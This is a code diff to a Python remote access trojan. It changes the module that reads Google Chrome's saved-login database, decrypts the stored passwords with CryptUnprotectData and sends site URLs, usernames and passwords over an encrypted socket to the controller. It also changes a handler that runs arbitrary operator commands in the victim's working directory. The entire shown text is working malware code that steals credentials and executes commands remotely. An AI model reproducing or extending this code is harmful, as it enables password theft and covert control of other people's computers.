@@ -125,13 +125,13 @@ while 1:
 			try:
 				connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep))
 				cursor = connection.cursor()
-				cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+				cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
 				for information in cursor.fetchall():
-					passw = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
+					passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
 					if passw:
-						sendpass += 'Website: ' + information[0]
-						sendpass += 'Username: ' + information[1]
-						sendpass += 'Password: ' + passw + '**n'
+						sendpass += '**n [*] Website-origin: ' + information[0] + '**n [*] Website-action: ' + information[1]
+						sendpass += '**n [*] Username: ' + information[2]
+						sendpass += '**n [*] Password: ' + passw + '**n'
 				if len(sendpass) > 15:
 					encrypted = EncodeAES(cipher, "%s**nEOFEOFEOFEOFEOFX" % (sendpass))
 				else:
@@ -193,9 +193,10 @@ while 1:
 		s.send(encrypted)
 
 	elif decrypted.startswith('run '):
-		t = threading.Thread(target = frunthis, args = (' '.join(decrypted.split(' ')[1:]) , ))
+		cmd = 'cd ' + pwd + '&&' + ' '.join(decrypted.split(' ')[1:]) 
+		t = threading.Thread(target = frunthis, args = (cmd , ))
 		t.start()
-		encrypted = EncodeAES(cipher, ' [*] Executed "' + ' '.join(decrypted.split(' ')[1:]) + '"**nEOFEOFEOFEOFEOFX')
+		encrypted = EncodeAES(cipher, ' [*] Executed "' + ' '.join(decrypted.split(' ')[1:]) + '" in ' + pwd + '**nEOFEOFEOFEOFEOFX')
 		s.send(encrypted)
 
 	else:
